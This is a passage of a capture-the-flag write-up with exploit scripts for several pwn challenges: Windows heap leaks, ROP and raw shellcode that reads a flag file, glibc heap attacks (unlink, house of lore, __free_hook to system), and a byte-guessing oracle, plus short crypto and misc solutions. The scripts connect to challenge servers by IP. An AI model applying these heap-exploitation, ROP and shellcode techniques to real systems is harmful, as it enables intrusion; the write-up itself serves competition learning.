show('\x02')
p.recvuntil('d' * 0xb0)
data = p.recvuntil('\norange', drop=1)
data = data[0x18:]
header = u64(data[:8])
heap = u64(data[8:16])
log.info('heap header: {}'.format(hex(header)))
log.info('heap: {}'.format(hex(heap)))
ptr = heap & 0xfffffffffffff000
ptr += ntdll_off
log.info('target : {}'.format(hex(ptr)))
free('\x02')
create('\x02', 'c' * 0x500)
create('\x02', 'e' * 0x58 + p64(header) + p64(ptr), 0x50)
show('\x01')
data = p.recvuntil('\norange', drop=1)
ntdll = u64(data[:8])
free('\x02')
ntdll -= to_ntdll
log.info('ntdll: {}'.format(hex(ntdll)))

create('\x02', 'c' * 0x500)
create('\x02', 'e' * 0x58 + p64(header) + p64(ntdll + to_peb), 0x50)
show('\x01')
data = p.recvuntil('\norange', drop=1)
peb = u64(data[:8])
log.info('peb: {}'.format(hex(peb)))
free('\x02')

create('\x02', 'c' * 0x500)
create('\x02', 'e' * 0x58 + p64(header) + p64(peb + to_stack), 0x50)
show('\x01')
data = p.recvuntil('\norange', drop=1)
stack = u64(data[:8])
log.info('stack: {}'.format(hex(stack)))
free('\x02')
target_stack = stack >> 16
target_stack += 1
target_stack <<= 16
target_stack -= 0x1000
stack = target_stack
log.info('stack target: {}'.format(hex(target_stack)))

create('\x02', 'c' * 0x500)
create('\x02', 'e' * 0x58 + p64(header) + p64(target_stack) + p64(0x1000), 0x50)
show('\x01')
data = p.recvuntil('\norange', drop=1)
index = data.find('\x19' + '\x00' * 15) - 0xd8
base = u64(data[index:index + 8]) - 0x1E38
log.info('base: ' + hex(base))
target_stack += index
log.info('stack target: {}'.format(hex(target_stack)))
free('\x02')

encode = heap & 0xfffffffffffff000
encode += 0x88
create('\x02', 'c' * 0x500)
create('\x02', 'e' * 0x58 + p64(header) + p64(encode), 0x50)
show('\x01')
data = p.recvuntil('\norange', drop=1)
encode = u64(data[:8])
log.info('encode: {}'.format(hex(encode)))
free('\x02')

create('\x02', 'c' * 0x500)
create('\x02', 'e' * 0x58 + p64(header) + p64(base + 0x3000), 0x50)
show('\x01')
data = p.recvuntil('\norange', drop=1)
kernel32 = u64(data[:8]) - 0x22680
log.info('kernel32: {}'.format(hex(kernel32)))
# free('\x02')
fake = heap & 0xfffffffffffff000
fake += 0xc20
create('a', '1' * 0x100)
create('b', '2' * 0x20)
create('c', '3' * 0x200)
create('d', '4' * 0x20)
create('e', '5' * 0x500)
create('f', '6' * 0x80)
create('g', '7' * 0x80)

free('a')
free('c')
create('e', '8' * 0x178 + p64(encode ^ 0x1000001806010007) + p64(heap) + p64(0x20) + 'nonick'.ljust(0x58, '.') + p64(
    encode ^ 0x1000000702010003) + 'nonick'.ljust(0x28, '.') + p64(encode ^ 0x328000028) + p64(base + 0x5630), 0x170)
logout()
p.sendlineafter('>>', '1')
p.sendlineafter(':', 'orange\x00\x00' + p64(encode ^ 0x328000028) + p64(fake) + p64(fake)[:-1])
p.sendlineafter(':', 'godlike')
payload = p64(base + 0x5630) * 2
payload += p64(stack) * 2
payload += p32(0)
payload += p32(0x4C0 | (1 << 0xd))
payload += p64(0)
payload += p64(0x1000)
payload += p64(0)
payload += '\xff' * 12 + '\x00' * 0x14
payload += p64(0xfa0)

create('f', payload, 0x270)
payload = 'a' * 0x10
payload += p64(heap & 0xfffffffffffff000)
payload += 'a' * 0x20
payload += p64(fake + 0x10)
create('g', payload, 0x270)
logout()
p.sendlineafter('>>', '1')
p.sendlineafter(':', 'orange')

p.sendlineafter(':', 'godlike')
payload = 'a' * ((target_stack & 0xfff) - 0x6a0)

addrsp = base + 0x01d0b
virtual_protect = kernel32 + 0x1B680
poprcx = ntdll + 0x9217b
poprdx = ntdll + 0x57642
popr8 = ntdll + 0x2010b
poprax = ntdll + 0x2010c
popr9_jmp = ntdll + 0x08fb15

payload += p64(addrsp)
payload += 'a' * 0x28
payload += p64(base + 0x1fcc)
payload += 'x' * 0x38
payload += p64(poprax)
payload += p64(virtual_protect)
payload += p64(poprcx)
payload += p64(stack)
payload += p64(poprdx)
payload += p64(0x1000)
payload += p64(popr8)
payload += p64(0x40)
payload += p64(popr9_jmp)
payload += p64(base + 0x5630)
payload += p64(0) * 2
payload += p64(stack + len(payload) + 0x20)
payload += '\x90' * 0x100

buf = [
    0x40, 0x57, 0x48, 0x81, 0xEC, 0x50, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
    0x00, 0x00, 0x48, 0x89, 0xAC, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x18, 0x4C, 0x8B,
    0x41, 0x10, 0x49, 0x8B, 0x78, 0x60, 0x4C, 0x8B, 0xCF, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x85, 0xFF, 0x74, 0x2C, 0x0F, 0xB7, 0x07, 0x33, 0xD2, 0xB9, 0x05, 0x15, 0x00, 0x00, 0x66,
    0x85, 0xC0, 0x74, 0x1D, 0x0F, 0xB7, 0xC0, 0xFF, 0xC2, 0x6B, 0xC9, 0x21, 0x03, 0xC8, 0x8B, 0xC2,
    0x0F, 0xB7, 0x04, 0x57, 0x66, 0x85, 0xC0, 0x75, 0xEB, 0x81, 0xF9, 0x55, 0x95, 0xDB, 0x6D, 0x74,
    0x0E, 0x4D, 0x8B, 0x00, 0x49, 0x8B, 0x78, 0x60, 0x49, 0x3B, 0xF9, 0x75, 0xC3, 0xEB, 0x09, 0x49,
    0x8B, 0x68, 0x30, 0x48, 0x85, 0xED, 0x75, 0x73, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x48, 0x18, 0x4C, 0x8B, 0x41, 0x10, 0x49, 0x8B, 0x78, 0x60, 0x4C, 0x8B, 0xCF,
    0x48, 0x85, 0xFF, 0x74, 0x2B, 0x0F, 0xB7, 0x0F, 0x33, 0xD2, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x66,
    0x85, 0xC9, 0x74, 0x1C, 0x0F, 0xB7, 0xC9, 0xFF, 0xC2, 0x6B, 0xC0, 0x21, 0x03, 0xC1, 0x8B, 0xCA,
    0x0F, 0xB7, 0x0C, 0x57, 0x66, 0x85, 0xC9, 0x75, 0xEB, 0x3D, 0x75, 0xEE, 0x40, 0x70, 0x74, 0x22,
    0x4D, 0x8B, 0x00, 0x49, 0x8B, 0x78, 0x60, 0x49, 0x3B, 0xF9, 0x75, 0xC4, 0xB8, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0xAC, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x50, 0x01, 0x00, 0x00,
    0x5F, 0xC3, 0x49, 0x8B, 0x68, 0x30, 0x48, 0x85, 0xED, 0x74, 0xE1, 0x48, 0x89, 0x9C, 0x24, 0x68,
    0x01, 0x00, 0x00, 0xBA, 0x97, 0x0F, 0x2C, 0x38, 0x48, 0x8B, 0xCD, 0x48, 0x89, 0xB4, 0x24, 0x48,
    0x01, 0x00, 0x00, 0x4C, 0x89, 0xB4, 0x24, 0x40, 0x01, 0x00, 0x00, 0xE8, 0x60, 0x01, 0x00, 0x00,
    0xBA, 0xFA, 0xC5, 0x96, 0xEB, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xF8, 0xE8, 0x50, 0x01, 0x00, 0x00,
    0xBA, 0x3C, 0x84, 0x78, 0xF1, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xD8, 0xE8, 0x40, 0x01, 0x00, 0x00,
    0xBA, 0x21, 0x99, 0x01, 0x71, 0x48, 0x8B, 0xCD, 0x4C, 0x8B, 0xF0, 0xE8, 0x30, 0x01, 0x00, 0x00,
    0xBA, 0xB0, 0xEC, 0x3C, 0x66, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xF0, 0xE8, 0x20, 0x01, 0x00, 0x00,
    0xBA, 0x20, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x4A, 0xE4, 0x33, 0xC9, 0x41, 0xB8, 0x00, 0x30, 0x00,
    0x00, 0x48, 0x8B, 0xE8, 0xFF, 0xD7, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD0, 0x48, 0x8B,
    0xF8, 0x33, 0xC0, 0xF3, 0xAA, 0x48, 0x89, 0x44, 0x24, 0x30, 0x45, 0x33, 0xC9, 0x49, 0x8B, 0xCA,
    0x45, 0x33, 0xC0, 0xBA, 0x00, 0x00, 0x00, 0x80, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,
    0x41, 0xC7, 0x02, 0x43, 0x3A, 0x5C, 0x64, 0x41, 0xC7, 0x42, 0x04, 0x61, 0x64, 0x61, 0x64, 0x41,
    0xC7, 0x42, 0x08, 0x62, 0x5C, 0x66, 0x6C, 0x41, 0xC7, 0x42, 0x0C, 0x61, 0x67, 0x2E, 0x74, 0x66,
    0x41, 0xC7, 0x42, 0x10, 0x78, 0x74, 0xC7, 0x44, 0x24, 0x20, 0x03, 0x00, 0x00, 0x00, 0xFF, 0xD3,
    0x4C, 0x8D, 0x8C, 0x24, 0x60, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x00,
    0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF,
    0xD6, 0xB9, 0xF5, 0xFF, 0xFF, 0xFF, 0x41, 0xFF, 0xD6, 0x4C, 0x8D, 0x8C, 0x24, 0x60, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48,
    0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD5, 0x4C, 0x8B, 0xB4, 0x24, 0x40, 0x01,
    0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x68, 0x01,
    0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0x70, 0x01, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x50,
    0x01, 0x00, 0x00, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB6, 0x11, 0x45, 0x33, 0xC0, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x84, 0xD2, 0x74, 0x16, 0x90,
    0x6B, 0xC0, 0x21, 0x0F, 0xBE, 0xD2, 0x45, 0x8D, 0x40, 0x01, 0x03, 0xC2, 0x41, 0x0F, 0xB6, 0x14,
    0x08, 0x84, 0xD2, 0x75, 0xEB, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x63, 0x41, 0x3C, 0x4C, 0x8B, 0xD9, 0x8B, 0xFA, 0x8B,
    0x8C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x75, 0x08, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20,
    0x5F, 0xC3, 0x45, 0x8B, 0x54, 0x0B, 0x20, 0x49, 0x8D, 0x04, 0x0B, 0x48, 0x89, 0x5C, 0x24, 0x30,
    0x8B, 0x58, 0x18, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x8B, 0x68, 0x1C, 0x48, 0x89, 0x74, 0x24, 0x40,
    0x8B, 0x70, 0x24, 0x4D, 0x03, 0xD3, 0x49, 0x03, 0xEB, 0x45, 0x33, 0xC9, 0x49, 0x03, 0xF3, 0x85,
    0xDB, 0x74, 0x1B, 0x41, 0x8B, 0x0A, 0x49, 0x03, 0xCB, 0xE8, 0x72, 0xFF, 0xFF, 0xFF, 0x3B, 0xC7,
    0x74, 0x23, 0x41, 0xFF, 0xC1, 0x49, 0x83, 0xC2, 0x04, 0x44, 0x3B, 0xCB, 0x72, 0xE5, 0x33, 0xC0,
    0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48,
    0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x42, 0x0F, 0xB7, 0x0C, 0x4E, 0x8B, 0x44, 0x8D, 0x00, 0x49, 0x03,
    0xC3, 0xEB, 0xDD
]
buf = ''.join([chr(x) for x in buf])
payload += buf

p.send(payload)
p.interactive()
```
### One Punch Man [292pts]

The vulnerability is a simple UAF, the relevant leakage is very easy, but we can only use `calloc` in normal allocation which does not use `tcache`, and `fastbin` and `unsorted bin` aren't allowed due to size limit. The hidden function allows to `malloc(0x217)`, but only when `0x220` `tcache` count is larger than 6, so we cannot write `fd` to achieve arbitrary write.

Initially we tried `unsorted bin attack`, but it seems that we must use chunk that will not be putted into `tcache` to do unsorted bin attack. Then I tried `house of lore` to allocate a chunk at `tcache arena`, however the program crashes at `memset` function since the size passed into `memset` function is too large. The root cause is that `calloc` uses the `chunk_size-0x10` as the argument of `memset`, and `chunk_size` can only be `0` or a heap address, which always gives a size that is way too large.

The solution is to use `unlink` first to rewrite `0x220 tcache pointer` to `&pointer - 0x18`, so that we can allocate a chunk at `tcache arena` to fake a `0x10` chunk size there first, then use `house of lore` attack again, and this time size passed into `memset` is `0x10-0x10=0` which does not cause any crash.

Then it is easy to rewrite the `0x220 tcache pointer` while still keeping `tcache count` being 7, by allocating `malloc(0x217)` we can achieve arbitrary memory write. We can write `__malloc_hook` and perform ROP since stack contents are controllable.

```python
from pwn import *

AES_BLOCK_SIZE = 16
g_local=0
context(log_level='debug', arch='amd64')
e = ELF("./libc.so.6")
if g_local:
    sh = process("./one_punch", env={"LD_LIBRARY_PATH":"."})
    gdb.attach(sh)
else:
    sh = remote("52.198.120.1", 48763)

def ce(cmd, idx, name):
    sh.send(cmd + '\x00')
    sh.sendafter("idx: ", str(idx) + '\x00')
    sh.sendafter("name: ", name)
    sh.recvuntil("> ")

create = lambda idx,name: ce('1', idx, name)
edit = lambda idx,name: ce('2', idx, name)

def show(idx):
    sh.send('3\x00')
    sh.sendafter("idx: ", str(idx) + '\x00')
    sh.recvuntil("name: ")
    ret = sh.recvuntil("\n####")[:-5]
    sh.recvuntil("> ")
    return ret

def delete(idx):
    sh.send('4\x00')
    sh.sendafter("idx: ", str(idx) + '\x00')
    return sh.recvuntil("> ")

def punch(data="a"):
    sh.send("50056".ljust(8, '\x00'))
    sh.send(data)
    sh.recvuntil("> ")

create(0, '0' * 0x217)
create(1, '1' * 0x217)

delete(0)
delete(1)

heap_addr = u64(show(1) + '\x00\x00') - 0x260

for i in xrange(5):
    create(0, '2' * 0x217)
    delete(0)

create(0, '2' * 0x217)
create(1, '3' * 0x217)
delete(0)

libc_addr = u64(show(0)+'\x00\x00') - 0x1e4ca0
print hex(heap_addr),hex(libc_addr)
delete(1)

punch() # consume 1 tcache
create(0, 'T' * 0x217)
delete(0)
edit(0, p64(0)*2)
delete(0)
# now top chunk + 0x10 == top elem in 0x220

for i in xrange(3):
    create(i, 'U' * 0x217)
for i in xrange(3):
    delete(i) # all merged to top

fake_chunk = p64(0) + p64(0x211)
fake_chunk += p64(heap_addr + 0x150 - 0x18)
fake_chunk += p64(heap_addr + 0x150 - 0x10)
fake_chunk = fake_chunk.ljust(0x210, 'F')
fake_chunk += p64(0x210) + p64(0x600)

create(0, cyclic(0x400))
edit(0, fake_chunk)
# 0x220 <- 0x200 top
# +0x1e0 <- g[2].ptr
create(2, cyclic(0x400))

# current heap layout:
# 0x400 chunk
# [fake 0x210 chunk + 0x600 chunk head, whose next is top]
# 0x400 chunk

delete(1) # unlink trigger, things merged to top

punch(p64(0x28))
# fake chunk_size for smallbin attack
# otherwise calloc will crash in memset

create(0, '7' * 0x217)
delete(0) # fill 0x220 tcache

# consolidate topchunk
for i in xrange(6):
    create(0, '4' * 0x1f0)
    delete(0)

create(1, 'P' * 0x217) # create a padding
create(0, '4' * 0x1f0) # last tcache chunk

delete(0) # put it to tcache
edit(0, p64(0) + p64(0))
# rewrite fd and key to bypass double free check

delete(0) # to topchunk
delete(1) # to topchunk

# now 0x200 -> 7, top element is behind topchunk
# now 0x220 -> 7

create(0, '5' * 0x220)
create(0, '4' * 0x1f0) # chunk_head == top at 0x200
create(1, '5' * 0x200)

delete(0)
create(1, '5' * 0x200) # put to smallbin

edit(0, p64(libc_addr+0x1e4e90) + p64(heap_addr+0x130))
delete(1)
edit(1, p64(0)*2 + p64(heap_addr+0x130))

create(0, 'C' * 0x1f0)
create(0, 'A' * 0x10 + p64(libc_addr + \
    e.symbols["__malloc_hook"]).ljust(0x1e0, '\x00'))

# add rsp,48; ret
punch(p64(libc_addr + 0x8cfd6) + "flag\x00")

pop_rdi = p64(libc_addr + 0x26542)
pop_rsi = p64(libc_addr + 0x26f9e)
pop_rdx = p64(libc_addr + 0x12bda6)
pop_rcx = p64(libc_addr + 0x10b31e)

rop = pop_rdi + p64(2)
rop += pop_rsi
rop += p64(libc_addr + e.symbols["__malloc_hook"] + 8)
rop += pop_rdx + p64(0)
rop += p64(libc_addr + e.symbols["syscall"])
rop += pop_rdi + p64(3)
rop += pop_rsi + p64(heap_addr + 0x2000)
rop += pop_rdx + p64(0x100)
rop += p64(libc_addr + e.symbols["read"])
rop += pop_rdi + p64(1)
rop += pop_rsi + p64(heap_addr + 0x2000)
rop += pop_rdx + p64(0x100)
rop += p64(libc_addr + e.symbols["write"])
rop += p64(0)

create(0, rop)

sh.interactive()
```

### 🎃 Trick or Treat 🎃 [234pts]
```python3
from pwn import *

debug = 0
if debug:
    p = process('./trick_or_treat', env={'LD_PRELOAD': './trick.libc'})
else:
    p = remote('3.112.41.140', 56746)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

p.sendlineafter(':', str(0x1000000))
p.recvuntil(':')
if debug:
    gdb.attach(p, 'b free ')
magic = int(p.recvuntil('\n'), 16)
libc.address = magic + 0x1001000 - 0x10
log.success('libc:' + hex(libc.address))

p.sendlineafter('e:',
                '{} {}'.format(hex((libc.symbols['__free_hook'] - magic) / 8)[2:], hex(libc.symbols["system"])[2:]))
p.sendlineafter('e:', '0' * 0x1000 + ' ' + 'ed')
#p.sendline('ls')
p.interactive()
```
```bash
!/bin/cat /home/trick_or_treat/flag.txt
```
## misc

### Welcome [50pts]
`:!cat flag`
### Revenge of Welcome [105pts]
`Ctrl+o` -> `:!cat flag`

### EmojiiVM [198pts]
```python

NOP = 1
ADD = 2
SUB = 3
MUL = 4
MOD = 5
XOR = 6
AND = 7
LWR = 8
EQU = 9
JMP = 10
JT = 11
JF = 12
# IMM = 13
POP = 14
# GET = 15
# SET = 16
NEW = 17
DEL = 18
EDIT = 19
SHOW = 20


def IMM(v):
    assert v <= 10
    return [13, -v]

def IMMX(v):
    if v <= 10:
        return IMM(v)
    else:
        hi, lo = divmod(v, 10)
        pl = IMMX(hi) + IMM(10) + [MUL]
        if lo != 0:
            pl += IMM(lo) + [ADD]
    return pl

def GET(idx, off):
    return IMMX(off) + IMMX(idx) + [15]

def SET(idx, off):
    return IMMX(off) + IMMX(idx) + [16]

def STR(idx, s):
    pl = []
    for i, c in enumerate(s):
        pl += IMMX(ord(c)) + IMMX(i) + IMM(idx) + [16] # set
    return pl

def GETI():
    return GET(0, 0)

def GETJ():
    return GET(0, 1)

def LOC(i):
    return [i | (1 << 30)] * 14 # len(IMMX(999))

pl = IMMX(20) + [NEW] + IMMX(20) + [NEW]
pl += STR(1, '0 * 0 = 0\n')

pl += IMM(1) + SET(0, 0) # i = 1
loc3 = len(pl)
pl += IMM(10) + GETI() + [LWR] + LOC(1) + [JF]

pl += IMM(1) + SET(0, 1) # j = 1
loc4 = len(pl)
pl += IMM(10) + GETJ() + [LWR] + LOC(2) + [JF]

pl += GETI() + IMMX(0x30) + [ADD] + SET(1, 0)
pl += GETJ() + IMMX(0x30) + [ADD] + SET(1, 4)
pl += GETI() + GETJ() + [MUL] + SET(0, 2)

pl += LOC(5) + IMM(10) + GET(0, 2) + [LWR] + LOC(5) + [JF]

pl += IMMX(10) + SET(1, 9) + IMM(0) + SET(1, 10)
pl += GET(0, 2) + IMMX(0x30) + [ADD] + SET(1, 8)
pl += IMM(1) + [SHOW]
pl += LOC(6) + [JMP]

loc5 = len(pl)
pl += IMMX(10) + SET(1, 10) + IMM(0) + SET(1, 11)
pl += IMM(10) + GET(0, 2) + [MOD] + IMMX(0x30) + [ADD] + SET(1, 9) # lo
pl += IMM(10) + GET(0, 2) + [MOD] + GET(0, 2) + [SUB] + SET(0, 2)
pl += IMM(0) + SET(0, 3)

loc7 = len(pl)
pl += IMM(10) + GET(0, 2) + [SUB] + SET(0, 2)
pl += IMM(1) + GET(0, 3) + [ADD] + SET(0, 3)
pl += LOC(7) + IMM(0) + GET(0, 2) + [EQU] + LOC(7) + [JF]

pl += GET(0, 3) + IMMX(0x30) + [ADD] + SET(1, 8) # hi
pl += IMM(1) + [SHOW]

loc6 = len(pl)
pl += IMM(1) + GETJ() + [ADD] + SET(0, 1)
pl += LOC(4) + [JMP]

loc2 = len(pl)
pl += IMM(1) + GETI() + [ADD] + SET(0, 0)
pl += LOC(3) + [JMP]

loc1 = len(pl)
pl += [0x17]

print(len(pl))
i = 0
while i < len(pl):
    v = pl[i]
    if v == LOC(1)[0]:
        r = loc1
    elif v == LOC(2)[0]:
        r = loc2
    elif v == LOC(3)[0]:
        r = loc3
    elif v == LOC(4)[0]:
        r = loc4
    elif v == LOC(5)[0]:
        r = loc5
    elif v == LOC(6)[0]:
        r = loc6
    elif v == LOC(7)[0]:
        r = loc7
    else:
        assert type(v) == int
        i += 1
        continue
    a, t = divmod(r, 100)
    b, c = divmod(t, 10)
    t = IMM(a) + IMM(10) + [MUL] + IMM(b) + [ADD] + IMM(10) + [MUL] + IMM(c) + [ADD]
    assert len(t) == 14
    pl = pl[:i] + t + pl[i + 14:]
    i += len(t)
print(pl)

consts = [128512,128513,128514,129315,128540,128516,128517,128518,128521,128522,128525,]
opcodes = [0,127539,10133,10134,10060,0x2753,10062,128107,128128,128175,128640,127542,127514,9196,128285,128228,128229,127381,127379,128196,128221,128289,128290,0x1F6D1,]

mp = {
0x23EC: '\xE2\x8F\xAC',
0x274c: '\xE2\x9D\x8C',
0x274e: '\xE2\x9D\x8E',
0x2753: '\xE2\x9D\x93',
0x2795: '\xE2\x9E\x95',
0x2796: '\xE2\x9E\x96',
0x1F193: '\xF0\x9F\x86\x93',
0x1F195: '\xF0\x9F\x86\x95',
0x1F21A: '\xF0\x9F\x88\x9A',
0x1F233: '\xF0\x9F\x88\xB3',
0x1F236: '\xF0\x9F\x88\xB6',
0x1f46b: '\xF0\x9F\x91\xAB',
0x1f480: '\xF0\x9F\x92\x80',
0x1f4af: '\xF0\x9F\x92\xAF',
0x1f4c4: '\xF0\x9F\x93\x84',
0x1f4dd: '\xF0\x9F\x93\x9D',
0x1f4e4: '\xF0\x9F\x93\xA4',
0x1f4e5: '\xF0\x9F\x93\xA5',
0x1f51d: '\xF0\x9F\x94\x9D',
0x1f521: '\xF0\x9F\x94\xA1',
0x1f522: '\xF0\x9F\x94\xA2',
0x1f600: '\xF0\x9F\x98\x80',
0x1f601: '\xF0\x9F\x98\x81',
0x1f602: '\xF0\x9F\x98\x82',
0x1f604: '\xF0\x9F\x98\x84',
0x1f605: '\xF0\x9F\x98\x85',
0x1f606: '\xF0\x9F\x98\x86',
0x1f609: '\xF0\x9F\x98\x89',
0x1f60a: '\xF0\x9F\x98\x8A',
0x1f60d: '\xF0\x9F\x98\x8D',
0x1f61c: '\xF0\x9F\x98\x9C',
0x1f680: '\xF0\x9F\x9A\x80',
0x1f6d1: '\xF0\x9F\x9B\x91',
0x1f923: '\xF0\x9F\xA4\xA3',
}


out = []
i = 0
while i < len(pl):
    v = pl[i]
    assert type(v) == int
    if v <= 0:
        t = abs(v)
        assert t <= 10
        out.append(mp[consts[t]])
        i += 1
    elif 0 < v and v < 0x18:
        out.append(mp[opcodes[v]])
        i += 1
    else:
        raise ValueError, v

open('payload', 'wb').write(''.join(out))
```

### heXDump [202pts]

xxd overwrites partially.
```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 anciety <anciety@anciety-pc>
#
# Distributed under terms of the MIT license.
import sys
import os
import os.path
import binascii
import string

from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1].split()

    p = process(PATH)


# by w1tcher who dominates pwnable challenges
def house_of_orange(head_addr, system_addr, io_list_all):
    payload = b'/bin/sh\x00'
    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)
    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \
            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
    return payload


orig_attach = gdb.attach
def gdb_attach(*args, **kwargs):
    if DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach


def choose(p, n):
    p.ru('quit\n')
    p.sl(str(n))


def write(p, s):
    choose(p, 1)
    p.ru('format)\n')
    p.sl(binascii.hexlify(s))
    

def read(p):
    choose(p, 2)
    return p.rl().strip()


def check(p, s):
    flag_sha1 = read(p)
    with open('temp', 'wb') as f:
        f.write(s)
    cmd = './getsha1.sh'.split()
    with process(cmd) as x:
        sha1 = x.rl().strip()
    if sha1 == flag_sha1:
        return True
    else:
        return False

def flag_len_le(p, n):
    p.info('checking length {}'.format(n))
    choose(p, 1337)
    s = 'a' * n
    write(p, s)
    if check(p, s):
        p.info('True')
        return True
    else:
        p.info('False')
        return False

def guess_length(p, l, r):
    p.info('l {} r {}'.format(l, r))
    if l == r:
        return l
    mid = (l + r) >> 1
    if flag_len_le(p, mid):
        r = mid
        return guess_length(p, l, r)
    else:
        l = mid + 1
        return guess_length(p, l, r)

flag_postfix = ''
def guess_byte(p, b, idx):
    global flag_postfix
    p.info('guessing #{} with {}'.format(idx, b))
    prepend_n = max(idx - 1, 0)
    guessing_flag = prepend_n * 'a' + b + flag_postfix
    p.info('testing {}'.format(guessing_flag))
    choose(p, 1337)
    if prepend_n > 0:
        write(p, 'a' * prepend_n)
    confirmed = check(p, guessing_flag)
    if confirmed:
        p.info('success, flag postfix {}'.format(flag_postfix))
        flag_postfix = b + flag_postfix
        return True
    else:
        p.info('failed')
        return False

def main():
    global flag_postfix
    #length = guess_length(0, 0x40) # 32
    length = 32
    
    for i in range(length, 0, -1):
        guessed = False
        for x in string.printable:
            #with process('ruby hexdump.rb'.split()) as p:
            with remote(HOST, PORT) as p:
                if guess_byte(p, x, i):
                    guessed = True
                    break
        if not guessed:
            raise Exception('not found for #{}'.format(i))

    p.info('flag {}'.format(flag_postfix))

    p.irt()

if __name__ == '__main__':
    main()


```

`getsha1.sh`

```shell
#!/bin/sh

sha1sum temp | awk '{ print $1 }'
```

### EV3 Player [207pts]

Analysis the .pklg file, there are three file in it. `fl.srf`, `ag.srf`, `hello.srf`，these files can open by Lego Mindstorms software. Load it, then we can hear the flag!

## crypto

### Lost Modulus Again [200pts]

The program leaks e, d, iqmp, ipmq.

ipmq * p = 1 (mod q)
iqmp * q = 1 (mod p)
=>
ipmq  * p + iqmp  * q - pq = 1    (eq1)

d * e = 1 (mod phi(n))
bitnum(d * e - 1) = 2068
bitnum(phi(n)) ~ 2048
=>
factor d\*e-1 get phi(n) by comparing the bitnum.
(p-1) * (q-1) = phi(n)    (eq2)

With eq1 and eq2 we can solve p, q.

### Very Simple Haskell [200pts]

There are only three blocks of length k to calculate.

We can get the flag if we known which primes are used to calculate the cyphertext.

One of the block contains the bit length of the message, which is already known. The other two blocks contain the message. Many bits of the message are known. The unknown part is only 48 bits.

We caculate the first k primes and their inverses under modulo n. All the known parts of blocks can be cleared away in the ciphertext by multiplying the inverse of the corresponding prime number. After that, the result, which is a product of at most 48 small primes and less than n, could be factored.


